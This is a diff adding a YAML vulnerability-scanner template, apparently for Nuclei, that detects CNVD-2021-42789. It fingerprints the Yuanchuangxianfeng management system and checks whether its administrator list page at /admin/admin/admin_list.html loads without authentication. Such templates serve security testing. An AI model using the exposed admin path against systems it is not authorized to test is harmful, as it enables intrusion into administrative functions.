@@ -1,0 +1,42 @@
+id: yuanchuangxianfeng-manager-system-unauthorized-access
+info:
+  name: Yuanchuangxianfeng Manager System Unauthorized Access (CNVD-2021-42789)
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: CNVD-2021-42789,unauthorized-access
+  description: |
+    The Yuanchuangxianfeng management system is vulnerable to unauthorized access, allowing attackers to view sensitive administrative pages.
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "https://www.bjycxf.com"
+        part: body
+
+  - raw:
+      - |
+        GET /admin/admin/admin_list.html HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "批量删除"
+          - "首页"
+          - "管理员列表"
+          - "导航元素"
+        part: body
